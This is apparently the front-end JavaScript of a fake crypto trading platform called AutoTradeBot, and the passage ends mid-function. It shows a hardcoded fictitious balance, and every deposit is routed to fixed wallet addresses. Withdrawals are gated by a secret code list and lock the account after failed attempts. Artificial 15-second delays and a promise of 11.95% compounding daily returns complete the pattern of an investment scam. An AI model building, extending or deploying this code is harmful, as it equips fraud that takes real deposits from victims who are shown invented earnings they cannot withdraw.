// ======= CONSTANTS =======
const TOTAL_BALANCE = 8250.78;
const USDT_DECIMALS = 6;
const walletAccountIDs = [
  "1048291756","9584207136","6732810945","4029158736","8164072395",
  "2057819463","9174623085","3841957260","5297401863","7609284153",
  "4632185097","5827049136","8714956203","6497012835","2396185740",
  "5048731962","7836241905","6104298735","9581726403","7246093815",
  "4308169527","8924056713","5179302468","3589172406","1497825036"
];
const validCodes = [
  "483921", "175064", "902718", "634285", "217509", "856430",
  "490127", "731694", "562803", "308417", "941256", "128374",
  "675820", "203519", "487960", "819432", "356701", "740528",
  "612947", "098135", "573864", "284691", "160738", "495260",
  "837514", "021693", "658407", "794135", "320586", "946172"
];
let sendAttempts = 0;

const depositAddresses = {
  "Bitcoin":   { addr: "bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu", label: "Bitcoin [BTC] Native" },
  "Ethereum":  { addr: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130", label: "Ethereum [ERC-20]" },
  "BNB":       { addr: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130", label: "BNB Smart Chain [BEP20]" },
  "Tron":      { addr: "TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco", label: "Tron [TRC-20]" }
};
const PAGE_STATE_KEY = 'autoTrade_lastPage';
const PAGE_STATE_ACTIVITY_KEY = 'autoTrade_lastPageActivity';

// ========== STORAGE KEYS ==========
const LS = {
  user: "autoTrade_user",
  walletMap: "autoTrade_walletMap",
  transactions: "autoTrade_transactions",
  withdraws: "autoTrade_withdrawals",
  withdrawSusp: "autoTrade_withdrawSusp",
  tradePositions: "autoTrade_trades",
  notif: "autoTrade_notif",
  notifMsgs: "autoTrade_notifMsgs",
  twofa: "autoTrade_2fa",
  twofaStatus: "autoTrade_2faStatus",
  theme: "autoTrade_theme"
};

// ========== UTILS ==========
function $(sel) { return document.querySelector(sel); }
function $all(sel) { return Array.from(document.querySelectorAll(sel)); }
const sleep = ms => new Promise(r=>setTimeout(r,ms));
function fmtUsd(n) { return typeof n === 'number' ? n.toLocaleString('en-US', {style:'currency',currency:'USD'}) : n; }
function shortAddr(addr) {
  if (!addr || typeof addr !== 'string') return "";
  if (addr.startsWith('0x') && addr.length > 10)
    return addr.slice(0,6) + "..." + addr.slice(-4);
  if (addr.length > 12) return addr.slice(0,5)+"..."+addr.slice(-4);
  return addr;
}
function now() { return Math.floor(Date.now()/1000); }
function saveLS(key, val) { localStorage.setItem(key, JSON.stringify(val)); }
function getLS(key, fallback) { try { return JSON.parse(localStorage.getItem(key)) ?? fallback; } catch { return fallback; } }
function delLS(key) { localStorage.removeItem(key); }
function show(el) { el.classList.remove('hide'); }
function hide(el) { el.classList.add('hide'); }
function copyToClipboard(txt) { navigator.clipboard.writeText(txt); }
function daysBetween(a,b) { return Math.ceil((b-a)/86400); }
function formatCountdown(s) {
  let d = Math.floor(s/86400), h=Math.floor((s%86400)/3600), m=Math.floor((s%3600)/60), sec=(s%60);
  return `${d>0?d+"d ":""}${h}h ${m}m ${sec}s`;
}
function setLastPage(page, activity = "") {
  saveLS(PAGE_STATE_KEY, page);
  saveLS(PAGE_STATE_ACTIVITY_KEY, activity);
}
function getLastPage() {
  return getLS(PAGE_STATE_KEY, null);
}
function getLastPageActivity() {
  return getLS(PAGE_STATE_ACTIVITY_KEY, null);
}

// ========== APP STATE ==========
let app = {
  user: null,
  walletMap: {},
  transactions: [],
  withdrawals: [],
  withdrawSusp: {},
  tradePositions: [],
  notif: {enabled:false},
  notifMsgs: [],
  twofa: {},
  twofaStatus: {},
  coinCache: [],
  marketTop: [],
  isLoading: false
};
// Load all persistent state
function loadAppState() {
  app.user = getLS(LS.user,null);
  app.walletMap = getLS(LS.walletMap,{});
  app.transactions = getLS(LS.transactions,[]);
  app.withdrawals = getLS(LS.withdraws,[]);
  app.withdrawSusp = getLS(LS.withdrawSusp,{});
  app.tradePositions = getLS(LS.tradePositions,[]);
  app.notif = getLS(LS.notif,{enabled:false});
  app.notifMsgs = getLS(LS.notifMsgs,[]);
  app.twofa = getLS(LS.twofa,{});
  app.twofaStatus = getLS(LS.twofaStatus,{});
  app.theme = getLS(LS.theme,"dark");
}

// ========== PAGE NAV ==========
function switchPage(pageId, activityState = null, skipPersist = false) {
  $all('.page').forEach(p => p.classList.add('hidden'));
  $('#' + pageId).classList.remove('hidden');
  if (!skipPersist) setLastPage(pageId, activityState || "");
  if (pageId === 'markets') loadMarkets();
  if (pageId === 'home') createTV('tvchart','BINANCE:BTCUSDT');
  if (pageId === 'trade') createTV('tradeChart','BINANCE:BTCUSDT');
  if (pageId === 'futures') createTV('futuresChart','BINANCE:BTCUSDT');
  if (activityState === "withdrawalProcessing") restoreWithdrawProcessingModal();
  if (activityState === "withdrawalSuccess") restoreWithdrawSuccessModal();
}

window.addEventListener('popstate', function(e) {
  let lastPage = getLastPage();
  let lastActivity = getLastPageActivity();
  if (lastPage) switchPage(lastPage, lastActivity, true);
});

function goBackPage() {
  window.history.back();
}

// Footer nav
$all('.tab').forEach(t=>t.addEventListener('click',()=>{
  const tgt=t.dataset.target; switchPage(tgt);
  $all('.tab').forEach(x=>x.classList.remove('tab-active','opacity-100'));
  t.classList.add('tab-active');
}));

// ========== MARKETS ==========
async function loadMarkets() {
  try {
    const url = 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=50&page=1&sparkline=false&price_change_percentage=24h';
    const res = await fetch(url); const data = await res.json();
    app.marketTop = data;
    $('#topCoinsList').innerHTML = data.slice(0,8).map(c=>`
      <div class="flex items-center justify-between py-2">
        <div class="flex items-center gap-3">
          <img src="${c.image}" class="w-6 h-6 rounded" />
          <div class="text-sm">
            <div class="font-medium">${c.name} <span class="text-xs text-gray-400 uppercase">(${c.symbol})</span></div>
            <div class="text-xs text-gray-500">Mkt Cap: ${Math.round(c.market_cap).toLocaleString()}</div>
          </div>
        </div>
        <div class="text-right">
          <div class="font-semibold">${fmtUsd(c.current_price)}</div>
          <div class="text-xs ${c.price_change_percentage_24h >= 0 ? 'text-green-400' : 'text-red-400'}">${(c.price_change_percentage_24h||0).toFixed(2)}%</div>
        </div>
      </div>`).join('');
    $('#marketsList').innerHTML = data.map(c=>`
      <div class="flex items-center justify-between p-2 border-b border-gray-800" data-coin="${c.id}">
        <div class="flex items-center gap-3">
          <img src="${c.image}" class="w-6 h-6 rounded" />
          <div class="text-sm">
            <div class="font-medium">${c.name}</div>
            <div class="text-xs text-gray-400">${c.symbol.toUpperCase()}</div>
          </div>
        </div>
        <div class="text-right">
          <div class="font-semibold">${fmtUsd(c.current_price)}</div>
          <div class="text-xs ${c.price_change_percentage_24h >= 0 ? 'text-green-400' : 'text-red-400'}">${(c.price_change_percentage_24h||0).toFixed(2)}%</div>
        </div>
      </div>`).join('');
    const sorted = data.slice().sort((a,b)=>(b.price_change_percentage_24h||0)-(a.price_change_percentage_24h||0));
    $('#gainers').innerHTML = sorted.slice(0,4).map(c=>`
      <div class="flex items-center gap-2"><img src="${c.image}" class="w-5 h-5"/><div class="flex-1">${c.symbol.toUpperCase()} <div class="text-xs text-gray-400">${fmtUsd(c.current_price)}</div></div><div class="text-sm text-green-400">${(c.price_change_percentage_24h||0).toFixed(1)}%</div></div>`).join('');
    $('#losers').innerHTML = sorted.slice(-4).reverse().map(c=>`
      <div class="flex items-center gap-2"><img src="${c.image}" class="w-5 h-5"/><div class="flex-1">${c.symbol.toUpperCase()} <div class="text-xs text-gray-400">${fmtUsd(c.current_price)}</div></div><div class="text-sm text-red-400">${(c.price_change_percentage_24h||0).toFixed(1)}%</div></div>`).join('');
  } catch(e){console.warn('markets failed',e);}
}

// ========== USDT / WALLET ==========
async function loadUsdt() {
  try {
    const res = await fetch('https://api.coingecko.com/api/v3/coins/tether');
    const data = await res.json();
    $('#usdtLogo').src = data.image.thumb;
    const market = await (await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=tether')).json();
    if (market && market[0]) $('#usdtPrice').innerText = fmtUsd(market[0].current_price);
    $('#walletHoldings').innerHTML = `<div class="flex items-center justify-between">
      <div class="flex items-center gap-3">
        <img src="${data.image.thumb}" class="w-6 h-6 rounded" />
        <div>
          <div class="font-medium">Tether USD (USDT)</div>
          <div class="text-xs text-gray-400">Balance</div>
        </div>
      </div>
      <div class="text-right font-semibold">${fmtUsd(TOTAL_BALANCE)}</div>
    </div>`;
  } catch(e){console.warn('usdt failed',e);}
}

// ========== TRADINGVIEW CHARTS ==========
function createTV(containerId, symbol='BINANCE:BTCUSDT') {
  const container = document.getElementById(containerId); if (container) container.innerHTML = '';
  return new window.TradingView.widget({
    container_id: containerId,
    width: '100%',
    height: container?.clientHeight || 320,
    symbol,
    interval: '60',
    timezone: 'Etc/UTC',
    theme: 'dark',
    style: '1',
    locale: 'en',
    toolbar_bg: '#0b0f14',
    enable_publishing: false,
    withdateranges: true,
    allow_symbol_change: true
  });
}
let tvHome = createTV('tvchart', 'BINANCE:BTCUSDT');
let tvTrade = createTV('tradeChart', 'BINANCE:BTCUSDT');
let tvFutures = createTV('futuresChart', 'BINANCE:BTCUSDT');
$('#loadSymbol').addEventListener('click', ()=> {
  const sym = $('#tradeSymbol').value;
  tvTrade = createTV('tradeChart', sym);
});

// ========== INITIAL LOAD ==========
(function init(){
  loadAppState();
  let lastPage = getLastPage();
  let lastActivity = getLastPageActivity();
  // Set wallet/account info if logged in
  if (app.user?.accountId) {
    $('#walletId').innerText = app.user.accountId;
    $('#walletId2').innerText = app.user.accountId;
  }
  $('#totalBalance').innerText = fmtUsd(TOTAL_BALANCE);
  $('#totalBalance2').innerText = fmtUsd(TOTAL_BALANCE);
  loadUsdt(); loadMarkets();
  setInterval(loadMarkets, 60000);
  setInterval(loadUsdt, 60000);
  handleMarketNotif();
  // Restore last page/activity on load
  if (lastPage) switchPage(lastPage, lastActivity, true);
  else if (app.user?.accountId) switchPage('home');
  else switchPage('landingPage');
})();

// ========== WITHDRAWAL MODAL RESTORE ==========
function restoreWithdrawProcessingModal() {
  let withdrawals = getLS(LS.withdraws, []);
  let ongoing = withdrawals.filter(wd=>wd.status==="processing" && now()<wd.end);
  if (ongoing.length) showWithdrawProcessing(ongoing[ongoing.length-1]);
}
function restoreWithdrawSuccessModal() {
  let withdrawals = getLS(LS.withdraws, []);
  let completed = withdrawals.filter(wd=>wd.status==="completed");
  if (completed.length) showWithdrawSuccessModal(completed[completed.length-1]);
}

// ========== INSTALL PROMPT ==========
document.getElementById('getMobileAppBtn').onclick = function() {
  show($('#installPrompt'));
};
$('#installNowBtn').onclick = function() { hide($('#installPrompt')); };
$('#maybeLaterBtn').onclick = function() { hide($('#installPrompt')); };

// ========== MORE MENU ==========
$('#moreBtn').addEventListener('click', ()=> $('#moreMenu').classList.toggle('hidden'));
document.addEventListener('click', (e)=> {
  if (!e.target.closest('#moreBtn') && !e.target.closest('#moreMenu')) $('#moreMenu').classList.add('hidden');
});

// ========== NOTIFICATIONS ==========
function handleMarketNotif() {
  if (app.notif.enabled) {
    let lastPop = getLS("autoTrade_lastNotif",0);
    if (now()-lastPop > 43200) {
      fetch('https://api.coingecko.com/api/v3/status_updates?project_type=coin&per_page=1&page=1')
      .then(r=>r.json()).then(res=>{
        if (res?.status_updates?.length) {
          let news = res.status_updates[0].description;
          $('#homeMarketNotif').innerText = news;
          show($('#homeMarketNotif'));
          setTimeout(()=>hide($('#homeMarketNotif')),9000);
          localStorage.setItem("autoTrade_lastNotif",now());
        }
      });
    }
  }
}

// ========== WALLET CONNECT ==========
let currentProvider = null, connectedAddr = null;
$('#connectWalletBtn').onclick = async function() {
  show($('#walletModal'));
};
$('#closeWalletModal').onclick = function() { hide($('#walletModal')); };
$('#connectMetaMask').onclick = async function() {
  hide($('#walletModal'));
  if (window.ethereum) {
    try {
      const [addr] = await window.ethereum.request({method:"eth_requestAccounts"});
      connectedAddr = addr;
      onWalletConnected(addr);
    } catch(e){alert("MetaMask error: "+e.message);}
  } else alert("MetaMask not detected.");
};
$('#connectWalletConnect').onclick = async function() {
  hide($('#walletModal'));
  let addr = prompt("Enter your Ethereum address (WalletConnect simulation):");
  if (addr && addr.length > 5) onWalletConnected(addr);
};
$('#connectTron').onclick = async function() {
  hide($('#walletModal'));
  if (window.tronWeb && window.tronWeb.defaultAddress?.base58) {
    connectedAddr = window.tronWeb.defaultAddress.base58;
    onWalletConnected(connectedAddr);
  } else alert("TronLink not detected.");
};
$('#manualAddress').onclick = function() {
  show($('#manualAddressInput'));
};
$('#manualConfirm').onclick = function() {
  let v = $('#manualInput').value.trim();
  if (v && v.length > 5) { hide($('#walletModal')); onWalletConnected(v); }
  else alert("Invalid address.");
};
function onWalletConnected(addr) {
  let map = getLS(LS.walletMap,{});
  let accId = map[addr];
  if (!accId) {
    let used = Object.values(map);
    accId = walletAccountIDs.find(id=>!used.includes(id));
    if (!accId) accId = String(Math.floor(1000000000+Math.random()*9000000000));
    map[addr] = accId;
    saveLS(LS.walletMap,map);
  }
  app.user = {address: addr, accountId: accId};
  saveLS(LS.user, app.user);
  $('#walletId').innerText = accId;
  $('#walletId2').innerText = accId;
  $('#totalBalance').innerText = fmtUsd(TOTAL_BALANCE);
  $('#totalBalance2').innerText = fmtUsd(TOTAL_BALANCE);
  show($('#saveAccPopup'));
  switchPage('home');
}

// ========== LOGIN ID PAGE ==========
$('#loginIdBtn').onclick = function() {
  $('#loginInput').value = '';
  $('#loginMsg').innerText = '';
  show($('#loginModal'));
};
$('#loginConfirm').onclick = async function() {
  let v = $('#loginInput').value.trim();
  if (!v.match(/^\d{10}$/)) { $('#loginMsg').innerText = "Enter a valid 10-digit Account ID."; return; }
  $('#loginMsg').innerText = "Logging in...";
  await sleep(15000);
  let wmap = getLS(LS.walletMap,{});
  let found = Object.entries(wmap).find(([a,id])=>id===v);
  if (found) {
    app.user = {address: found[0], accountId: v};
    saveLS(LS.user, app.user);
    $('#walletId').innerText = v;
    $('#walletId2').innerText = v;
    $('#loginMsg').innerText = "Success!";
    hide($('#loginModal'));
    switchPage('home');
  } else {
    $('#loginMsg').innerText = "Connect wallet to get a wallet id.";
  }
};
$('#loginModal').addEventListener('click',e=>{
  if(e.target===e.currentTarget)hide($('#loginModal'));
});

// ========== SAVE ACCOUNT POPUP ==========
$('#showAccountBtn').onclick = function() {
  $('#accModalAddr').innerText = app.user?.address||"";
  $('#accModalID').innerText = app.user?.accountId||"";
  $('#accModalBal').innerText = fmtUsd(TOTAL_BALANCE);
  hide($('#saveAccPopup')); show($('#accountModal'));
};
$('#closeSaveAccPopup').onclick = function() { hide($('#saveAccPopup')); };

// ========== ACCOUNT MODAL ==========
$('#closeAccModal').onclick = function() { hide($('#accountModal')); };
$('#secureAccBtn').onclick = function() { hide($('#accountModal')); showGoogleAuth(); };

// ========== GOOGLE AUTH (2FA) ==========
function showGoogleAuth() {
  const accId = app.user?.accountId;
  if (!accId) return;
  let secret = app.twofa[accId] || window.otplib.authenticator.generateSecret();
  app.twofa[accId] = secret;
  saveLS(LS.twofa, app.twofa);
  const uri = window.otplib.authenticator.keyuri(accId, "AutoTradeBot", secret);
  $('#authAccID').innerText = accId;
  $('#gaSecret').innerText = secret;
  var qr = new QRious({element:$('#gaQR'), value:uri, size:120, background:"#fff", foreground:"#000"});
  $('#gaCode').value = ""; $('#gaMsg').innerText = "";
  show($('#authModal'));
}
$('#gaVerifyBtn').onclick = async function() {
  let code = $('#gaCode').value.trim();
  let accId = app.user?.accountId, secret = app.twofa[accId];
  $('#gaMsg').innerText = "Verifying...";
  await sleep(15000);
  if (window.otplib.authenticator.check(code,secret)) {
    app.twofaStatus[accId] = true;
    saveLS(LS.twofaStatus, app.twofaStatus);
    $('#gaMsg').innerText = "2FA enabled!";
  } else {
    $('#gaMsg').innerText = "Invalid code. Try again.";
  }
};
$('#gaCloseBtn').onclick = function() { hide($('#authModal')); };

// ========== DEPOSIT ==========
$('#depositBtn').onclick = async function() {
  $('#depositSearch').value = "";
  if (!app.coinCache.length) {
    let coins = await fetch('https://api.coingecko.com/api/v3/coins/list').then(r=>r.json());
    let mkts = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=250&page=1').then(r=>r.json());
    app.coinCache = mkts.map(c=>({id:c.id,name:c.name,symbol:c.symbol,thumb:c.image}));
  }
  $('#depositCoinList').innerHTML = app.coinCache.slice(0,15).map(c=>`
    <div class="flex items-center gap-3 p-2 cursor-pointer coin-row" data-id="${c.id}">
      <img src="${c.thumb}" class="w-6 h-6 rounded" /><span>${c.name} (${c.symbol.toUpperCase()})</span>
    </div>`).join('');
  show($('#depositModal'));
};
$('#closeDepositModal').onclick = function() { hide($('#depositModal')); };
$('#depositSearch').oninput = function() {
  let q=this.value.trim().toLowerCase();
  let coins=app.coinCache.filter(c=>c.name.toLowerCase().includes(q)||c.symbol.includes(q));
  $('#depositCoinList').innerHTML = coins.slice(0,25).map(c=>`
    <div class="flex items-center gap-3 p-2 cursor-pointer coin-row" data-id="${c.id}">
      <img src="${c.thumb}" class="w-6 h-6 rounded" /><span>${c.name} (${c.symbol.toUpperCase()})</span>
    </div>`).join('');
};
$('#depositCoinList').onclick = function(e) {
  let row = e.target.closest('.coin-row'); if (!row) return;
  $('#depositModal').classList.add('hide');
  $('#depositNetList').innerHTML = Object.keys(depositAddresses).map(net=>`
    <button class="btn btn-secondary w-full my-2 deposit-net-btn" data-net="${net}">${depositAddresses[net].label}</button>
  `).join('');
  show($('#depositNetworkModal'));
};
$('#closeDepositNetModal').onclick = function() { hide($('#depositNetworkModal')); };
$('#depositNetList').onclick = function(e) {
  let btn = e.target.closest('.deposit-net-btn');
  if (!btn) return;
  let net = btn.dataset.net;
  let addr = depositAddresses[net].addr;
  $('#depNetLabel').innerText = depositAddresses[net].label;
  $('#depAddrLabel').innerText = addr;
  new QRious({element:$('#depQrCanvas'), value:addr, size:120, background:"#fff", foreground:"#000"});
  show($('#depositAddressModal'));
};
$('#copyDepAddr').onclick = function() {
  copyToClipboard($('#depAddrLabel').innerText);
  alert("Address copied!");
};
$('#closeDepositAddrModal').onclick = function() { hide($('#depositAddressModal')); };

// ========== WITHDRAW ==========
$('#withdrawBtn').onclick = function() { show($('#withdrawSheet')); setLastPage('home'); };
$('#closeWithdrawSheet').onclick = function() { hide($('#withdrawSheet')); };
$('#onChainTransferBtn').onclick = function() {
  hide($('#withdrawSheet'));
  $('#wdAddr').value = '';
  $('#wdAmt').value = '';
  $('#wdDetailMsg').innerText = "";
  $('#wdNetwork').value = "Ethereum";
  show($('#withdrawDetailModal'));
};
$('#fillFromWallet').onclick = function() {
  $('#wdAddr').value = app.user?.address || "";
};
$('#wdMaxBtn').onclick = function() {
  $('#wdAmt').value = TOTAL_BALANCE;
};
$('#closeWithdrawDetail').onclick = function() { hide($('#withdrawDetailModal')); };
$('#wdSubmitBtn').onclick = function() {
  let addr = $('#wdAddr').value.trim();
  let amt = parseFloat($('#wdAmt').value);
  if (!addr || isNaN(amt) || amt<=0) { $('#wdDetailMsg').innerText="Enter valid address and amount"; return; }
  hide($('#withdrawDetailModal'));
  $('#wdCodeInput').value = ""; $('#wdCodeMsg').innerText="";
  show($('#withdrawCodeModal'));
};
$('#closeWithdrawCode').onclick = function() { hide($('#withdrawCodeModal')); };

$('#wdCodeSubmit').onclick = async function() {
  let code = $('#wdCodeInput').value.trim();
  let addr = $('#wdAddr').value.trim(), amt = parseFloat($('#wdAmt').value), net = $('#wdNetwork').value;
  $('#wdCodeMsg').innerText = "Processing...";
  await sleep(15000);

  let susp = getLS(LS.withdrawSusp, {})[app.user.accountId];
  if (susp && now() < susp.until) {
    $('#wdCodeMsg').innerText = `Withdrawals suspended for ${formatCountdown(susp.until-now())}`;
    return;
  }
  if (validCodes.includes(code)) {
    let wd = {
      address: addr, amount: amt, network: net,
      start: now(), end: now()+86400, status: "processing",
      userId: app.user.accountId
    };
    let withdrawals = getLS(LS.withdraws, []);
    withdrawals.push(wd);
    saveLS(LS.withdraws, withdrawals);

    let txs = getLS(LS.transactions, []);
    txs.push({type:'withdraw', ...wd});
    saveLS(LS.transactions, txs);

    hide($('#withdrawCodeModal'));
    showWithdrawProcessing(wd);
    setLastPage('home', 'withdrawalProcessing');
    renderOngoingWithdrawals();
  } else {
    sendAttempts++;
    if (sendAttempts >= 5) {
      let suspObj = getLS(LS.withdrawSusp, {});
      suspObj[app.user.accountId] = {until: now()+172800, count: sendAttempts};
      saveLS(LS.withdrawSusp, suspObj);
      $('#wdCodeMsg').innerText = "Withdrawal suspended for 48 hours.";
    } else {
      $('#wdCodeMsg').innerText = "Validation failed please enter correct code";
    }
  }
};

function showWithdrawProcessing(wd) {
  $('#wpAddr').innerText = wd.address;
  $('#wpNetwork').innerText = wd.network;
  $('#wpAmt').innerText = fmtUsd(wd.amount);

  function update() {
    let cd = wd.end - now();
    $('#wpCountdown').innerText = formatCountdown(cd>0?cd:0);
    if (cd <= 0) {
      clearInterval(timer);
      let withdrawals = getLS(LS.withdraws, []);
      withdrawals = withdrawals.map(w=>{
        if (w.start === wd.start && w.userId === wd.userId && w.address === wd.address) {
          w.status = "completed";
          w.completedAt = now();
        }
        return w;
      });
      saveLS(LS.withdraws, withdrawals);
      $('#usdtPrice').innerText = fmtUsd(0.0680);
      showWithdrawSuccessModal(wd);
      setLastPage('home', 'withdrawalSuccess');
      renderOngoingWithdrawals();
    }
  }
  show($('#withdrawProcessModal'));
  update();
  let timer = setInterval(update, 1000);

  $('#wpCloseBtn').onclick = function() {
    hide($('#withdrawProcessModal'));
    clearInterval(timer);
    setLastPage('home');
  };
  $('#wpViewDetails').onclick = function() {
    switchPage('home');
    hide($('#withdrawProcessModal'));
    setLastPage('home', 'withdrawalProcessing');
    setTimeout(renderOngoingWithdrawals, 100);
  };
}

function showWithdrawSuccessModal(wd) {
  $('#wsDetails').innerHTML = `
    <div>Address: ${wd.address}</div>
    <div>Amount: ${fmtUsd(wd.amount)}</div>
    <div>Network: ${wd.network}</div>
  `;
  show($('#withdrawSuccessModal'));
  $('#wsCloseBtn').onclick = function() {
    hide($('#withdrawSuccessModal'));
    setLastPage('home');
    renderOngoingWithdrawals();
  };
}

// ========== PAGE ACTIVITY RESTORE  ==========
function renderOngoingWithdrawals() {
  const ongoing = (getLS(LS.withdraws, []) || []).filter(wd => wd.status === "processing" && now() < wd.end);
  let list = ongoing.map(wd => {
    const left = wd.end-now();
    return `
      <div class="bg-gray-800 rounded p-2 mb-2">
        <div><b>Processing Withdrawal</b></div>
        <div>Address: <span>${wd.address}</span></div>
        <div>Network: <span>${wd.network}</span></div>
        <div>Amount: <span>${fmtUsd(wd.amount)}</span></div>
        <div>Time Remaining: <span class="countdown" data-end="${wd.end}">${formatCountdown(left)}</span></div>
      </div>
    `;
  }).join('');
  $('#recentTx').innerHTML = list || '<div class="text-gray-400">No transactions — demo mode.</div>';
}
function updateCountdownDisplays() {
  $all('.countdown').forEach(el=>{
    const end = parseInt(el.dataset.end,10);
    const left = end-now();
    el.innerText = formatCountdown(left>0?left:0);
  });
}
function restoreWithdrawalsUI() {
  let withdrawals = getLS(LS.withdraws, []);
  withdrawals.filter(wd=>wd.status==="processing" && now()<wd.end)
    .forEach(wd => showWithdrawProcessing(wd));
  renderOngoingWithdrawals();
}
window.addEventListener('DOMContentLoaded', restoreWithdrawalsUI);
setInterval(() => {
  updateCountdownDisplays();
  renderOngoingWithdrawals();
}, 1000);

// ========== SWAP (DEMO) ==========
$('#swapBtn').onclick = function() { switchPage ('SwapPage'); };

// Persistent trade state
const TRADE_RETURNS_RATE = 0.1195; // 11.95% daily
const TRADE_DURATIONS = [1,2,3,4,5,6,7,8,9,10,11,12]; // months
const TRADE_STATE_KEY = "autoTrade_tradeState";
const MAIN_PORTFOLIO_KEY = "autoTrade_mainPortfolio"; // For homepage total portfolio

function getTradeState() {
  return getLS(TRADE_STATE_KEY, {
    trades: [],
    totalBalance: 5000, // default trade balance
    totalEarnings: 0,
    totalReturns: 0,
    lastSymbol: "BINANCE:BTCUSDT"
  });
}
function setTradeState(state) { saveLS(TRADE_STATE_KEY, state); }

function getMainPortfolio() {
  return getLS(MAIN_PORTFOLIO_KEY, { totalPortfolio: 8250.78 });
}
function setMainPortfolio(state) { saveLS(MAIN_PORTFOLIO_KEY, state); }

// ------ Main Entry Point from Trade Button -------
$('#tvTradeBtn').onclick = () => renderTradePage();
$('#placeTradeBtn').onclick = () => renderPlaceTradeActions();
$('#viewEarningsBtn').onclick = () => renderEarningsPage();

// ------ TradingView-style UI ------
function renderTradePage() {
  let state = getTradeState();
  // Main balances
  $('#tradeTotalBalance').innerText = fmtUsd(state.totalBalance);
  $('#tradeTotalEarnings').innerText = fmtUsd(state.totalEarnings);
  $('#tradeTotalReturns').innerText = fmtUsd(state.totalReturns);
  renderActiveTrades();
  embedTradeChart(state.lastSymbol);
  setLastPage('trade', '');
  setupHeaderFooterEvents();
}

function setupHeaderFooterEvents() {
  $('#tvNotifBtn').onclick = () => alert("TradingView notifications (demo)");
  $('#tvSettingsBtn').onclick = () => switchPage('settingsPage');
  $('#tvPortfolioBtn').onclick = () => switchPage('home');
  $('#tvDepositBtn').onclick = () => switchPage('depositPage');
  $('#tvTransferBtn').onclick = () => renderTransferPage();
  $('#tvTradeBtn').onclick = () => renderTradePage();
}

function embedTradeChart(symbol) {
  $('#tradeChart').innerHTML = '';
  let tvWidget = document.createElement('div');
  tvWidget.id = "tvChartEmbed";
  tvWidget.style = "height:340px;";
  $('#tradeChart').appendChild(tvWidget);
  new TradingView.widget({
    container_id: "tvChartEmbed",
    autosize: true,
    symbol: symbol,
    interval: "D",
    timezone: "Etc/UTC",
    theme: "dark",
    style: "1",
    locale: "en",
    toolbar_bg: "#0b0f14",
    enable_publishing: false,
    allow_symbol_change: true,
    studies: [],
    details: true,
    withdateranges: true,
    hide_side_toolbar: false
  });
}

// ------ Active Trades ------
function renderActiveTrades() {
  let state = getTradeState();
  let nowTs = now();
  let html = state.trades.length ?
    state.trades.map((t,i) => {
      let left = Math.max(0, t.end-nowTs);
      return `<div class="bg-gray-800 rounded p-2 mb-2">
        <div>Asset: ${t.symbol}</div>
        <div>Duration: ${t.duration} month(s) (${formatCountdown(left)})</div>
        <div>Status: ${left>0?"Active":"Completed"}</div>
        <div>Returns: ${fmtUsd(t.returns)}</div>
        <div>Earnings: ${fmtUsd(t.earnings)}</div>
      </div>`;
    }).join('')
    : '<div class="text-gray-400">No active trades</div>';
  $('#tradeActiveTradesList').innerHTML = html;
}

// ------ Place Trade Actions ------
function renderPlaceTradeActions() {
  $('#tradePanel').innerHTML = `
    <div class="tv-trade-actions">
      <button id="tradeDepositBtn" class="px-4 py-2 bg-yellow-500 text-black font-bold rounded mr-2">Deposit</button>
      <button id="tradeTransferBtn" class="px-4 py-2 bg-gray-800 text-yellow-300 font-bold rounded">Transfer</button>
    </div>
    <div class="tv-select-asset mt-4">
      <label>Select Asset to Trade:</label>
      <select id="tradeAssetSelect" class="bg-gray-800 px-2 py-2 rounded text-sm">
        <option value="BINANCE:BTCUSDT">BTC/USDT</option>
        <option value="BINANCE:ETHUSDT">ETH/USDT</option>
        <option value="BINANCE:BNBUSDT">BNB/USDT</option>
      </select>
      <button id="tradeAssetLoadBtn" class="px-3 py-2 bg-gray-800 rounded text-sm ml-2">Load Asset Chart</button>
    </div>
  `;
  $('#tradeDepositBtn').onclick = () => switchPage('depositPage');
  $('#tradeTransferBtn').onclick = () => renderTransferPage();
  $('#tradeAssetLoadBtn').onclick = function() {
    let symbol = $('#tradeAssetSelect').value;
    embedTradeChart(symbol);
    setTimeout(() => renderTradeDurationSelect(symbol), 15000);
  };
}

function renderTradeDurationSelect(symbol) {
  $('#tradePanel').innerHTML += `
    <div class="tv-trade-duration mt-4">
      <label>Select Trade Duration:</label>
      <select id="tradeDurationSelect" class="bg-gray-800 px-2 py-2 rounded text-sm">
        ${TRADE_DURATIONS.map(d=>`<option value="${d}">${d} month${d>1?'s':''}</option>`).join('')}
      </select>
      <button id="tradeDurationBtn" class="px-3 py-2 bg-gray-800 rounded text-sm ml-2">Confirm Duration</button>
    </div>
  `;
  $('#tradeDurationBtn').onclick = function() {
    let duration = parseInt($('#tradeDurationSelect').value);
    setTimeout(() => renderTradeOrderPage(symbol, duration), 15000);
  };
}

function renderTradeOrderPage(symbol, duration) {
  $('#tradePanel').innerHTML = `
    <div class="tv-trade-order mt-4">
      <div>Asset: <b>${symbol}</b></div>
      <div>Duration: <b>${duration} month${duration>1?'s':''}</b></div>
      <button id="tradeOrderBtn" class="px-4 py-2 bg-green-500 text-white font-bold rounded">Place Order</button>
    </div>
  `;
  $('#tradeOrderBtn').onclick = function() {
    activateTrade(symbol, duration);
    alert("Trade activated!");
    renderTradePage();
  };
}

function activateTrade(symbol, duration) {
  let state = getTradeState();
  let tradeStart = now();
  let tradeEnd = tradeStart + duration*2592000; // 1 month = 30 days
  let amount = state.totalBalance || 1000;
  let returns = 0, earnings = 0;
  let trade = {symbol, duration, start: tradeStart, end: tradeEnd, amount, returns, earnings, active: true};
  state.trades.push(trade);
  setTradeState(state);
  startTradeReturnsGenerator();
}

// ------ Daily Returns Generator ------
function startTradeReturnsGenerator() {
  let state = getTradeState();
  let nowTs = now();
  state.trades.forEach(trade => {
    if(trade.active && nowTs < trade.end) {
      let daysPassed = Math.floor((nowTs - trade.start)/86400);
      let returns = trade.amount * Math.pow(1 + TRADE_RETURNS_RATE, daysPassed) - trade.amount;
      trade.returns = returns;
      trade.earnings = trade.amount + returns;
      if(nowTs >= trade.end) trade.active = false;
    }
  });
  state.totalReturns = state.trades.reduce((a,t)=>a+t.returns,0);
